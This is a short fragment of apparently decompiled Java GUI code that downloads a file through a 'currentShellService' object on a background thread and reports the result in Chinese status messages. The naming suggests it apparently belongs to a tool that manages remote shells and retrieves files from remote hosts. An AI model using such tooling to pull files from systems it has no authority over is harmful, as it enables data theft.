               this.currentShellService.downloadFile(fileFullPath, localFilePath);
               String result = selectedFile.getName() + "下载完成,文件大小:" + selectedFile.length();
               Platform.runLater(() -> {
                  this.statusLabel.setText(result);
               });
            } catch (Exception var5) {
               Platform.runLater(() -> {
                  this.statusLabel.setText("操作失败:" + var5.getMessage());
               });
               var5.printStackTrace();
            }

         };
         Thread workThrad = new Thread(runner);
         this.workList.add(workThrad);
         workThrad.start();
      }
   }
}
